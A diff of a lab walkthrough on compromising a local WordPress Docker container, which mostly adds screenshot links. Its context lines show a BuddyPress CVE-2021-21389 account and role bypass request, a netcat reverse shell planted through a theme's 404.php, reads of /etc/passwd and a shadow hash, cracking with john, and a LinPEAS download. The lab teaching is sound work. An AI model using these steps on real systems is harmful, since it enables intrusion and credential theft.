@@ -23,13 +23,13 @@ Docker container escape
 Finding the entry point.
 The WPScan CLI tool is a free, for non-commercial use, black box WordPress security scanner written for security professionals and blog maintainers to test the security of their sites. The WPScan CLI tool uses our database of 38,274 WordPress vulnerabilities.
 
-![This is an image](https://github.com/warren2i/docker/tree/master/lab%20pics)
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/1.png?raw=true)
 
-
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/2.png?raw=true)
 
 But it can't find this vulnerability, this highlights why tools shouldnt be relied upon for detection, it does give us an interesting hint that the plugin buddypress is out of date.
 
-
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/3.png?raw=true)
 
 A quick google for buddypress + vulnerabilities revealed the following cve. https://www.cvedetails.com/cve/CVE-2021-21389/
 
@@ -47,9 +47,9 @@ Creating a user account with auth bypass
 /buddypress/v1/signup is the endpoint to create a user account
 
 We will craft a request to create an account.
-
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/4.png?raw=true)
 Let's craft the request.
-
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/5.png?raw=true)
 ```
 POST /wp-json/buddypress/v1/signup HTTP/1.1
 HOST: 192.168.0.16:7006
@@ -104,7 +104,7 @@ Let's check what other endpoints are of interest?
  
 On the buddypress rest api docs, if you scroll down only 2 divs you can find an activation endpoint. Who wrote this code?
  
-
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/6.png?raw=true)
  
  
  
@@ -151,7 +151,8 @@ Content-Type: application/json; charset=UTF-8
 
 Let's try to login… Success. But we are not admin. This far we have only tested if the endpoints will allow account creation, and the fact the verification step was so easy to bypass that it is worth investigating further what exists?
  
-
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/7.png?raw=true)
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/8.png?raw=true)
  
 Finding the nonce.
 
@@ -168,6 +169,8 @@ Let's check the groups for the nonce?
  
  
 Lets create a group
+
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/9.png?raw=true)
 
 Use Burp Suite proxy and pause the requests and step over, follow the workflow to create a group, keep your eyes peeled for the X-WP-Nonce and Cookie.
 
@@ -238,6 +241,7 @@ Nice, see roles":["administrator"] let's check if we have elevated?
 
 Visit the http://192.168.0.16:7006/wp-admin/users.php to check the Role of the account we created
 
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/10.png?raw=true)
 
 
 Congrats.
@@ -258,7 +262,7 @@ On the attacking machine start up a netcat listener using the command nc -lvp <<
 To visit this page browse to url
 http://192.168.0.16:7006//wordpress/wp-content/themes/Goldly/404.php
  
-
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/11.png?raw=true)
  
 Reverse shell connects to the attacker, now we run the whoami command to get the current user. www-data
  
@@ -276,7 +280,7 @@ First let's  get a list of users by reading the contents of the passwd file
 cat /etc/passwd
 ```
 
-
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/12.png?raw=true)
 
 root will be our target as it has the highest privs.
 
@@ -294,11 +298,11 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 
 LinPEAS will format the results in the following color code based on the % chance of success of a vector.
 
-
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/13.png?raw=true)
 
 Interesting results
 
-
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/14.png?raw=true)
 
 
 Shadow files shouldn’t be accessible to low privileged users, this file contains a list of all user accounts and password hashes
@@ -309,6 +313,9 @@ root:$6$.ctyXo1jtgIm.fCk$PgUb7kyoLElbx5IBNzw9KKDLnxlanLv15LY0pELWDvWR4mstD4kUnzB
 ```
 
 Understanding the shadow file format.
+ 
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/15.png?raw=true)
+ 
 ```
 All fields are separated by a colon (:)
 Field 1 is username
@@ -334,7 +341,7 @@ We are using the provided john.lst wordlist provided with kali linux.
 
 Result.
 
-
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/16.png?raw=true)
 
 Luckily a password in the list matched the hash we found previously.
 The root password is security.
@@ -348,14 +355,19 @@ su root
 
 whoami to check current user
 
+ 
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/17.png?raw=true)
 
 
 What is outside of the box?
+ 
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/18.png?raw=true)
+ 
 Remember when we ran LinPEAS in the previous chapter?
 
 It also runs some instance detection to detect if we are running inside of a container.
 
-
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/19.png?raw=true)
 
 Looks like we are running inside a docker container, i wonder what if anything is outside of the box?
 
@@ -363,6 +375,8 @@ Let's check if the host disk is mounted.
 ```
 fdisk -l
 ```
+ 
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/20.png?raw=true)
 
 
 
